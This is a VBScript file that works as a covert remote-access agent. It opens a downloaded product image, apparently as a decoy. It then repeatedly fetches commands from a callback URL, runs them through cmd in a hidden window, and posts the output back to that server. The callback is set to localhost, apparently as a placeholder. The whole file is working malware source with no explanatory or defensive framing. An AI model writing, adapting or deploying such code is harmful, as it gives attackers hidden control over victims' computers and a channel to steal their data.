On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmpFolder 
tmpFolder = fso.GetSpecialFolder(2)
CONST callbackUrl = "http://localhost:80/"
Set oShell = CreateObject ("WScript.Shell") 
oShell.run "cmd.exe /C curl ""https://m.media-amazon.com/images/I/71aNYIIU8gL.%20UC256,256%20CACC,256,256%20.jpg"" -o " & tmpFolder & "\tmp.jpg & start "" "" " & tmpFolder & "\tmp.jpg & timeout 3", 0, True

Dim xmlHttpReq, shell, execObj, command, break, result

Set shell = CreateObject("WScript.Shell")



break = False
While break <> True
    Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, false
	xmlHttpReq.SetTimeouts 10000, 10000, 10000, 100000
    xmlHttpReq.Send

    command = "cmd /c " & Trim(xmlHttpReq.responseText) & " > " &  tmpFolder & "\out.txt" 

    If InStr(command, "EXIT") Then
        break = True
    Else
        With CreateObject("WScript.Shell")

			' Pass 0 as the second parameter to hide the window...
			.Run command, 0, True

		End With
		
		result = ""
		
		With CreateObject("Scripting.FileSystemObject")
			
			result = .OpenTextFile(tmpFolder & "\out.txt").ReadAll()
			.DeleteFile tmpFolder & "\out.txt"

		End With

        Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, false
		xmlHttpReq.SetTimeouts 10000, 10000, 10000, 10000
        xmlHttpReq.Send(result)
    End If
Wend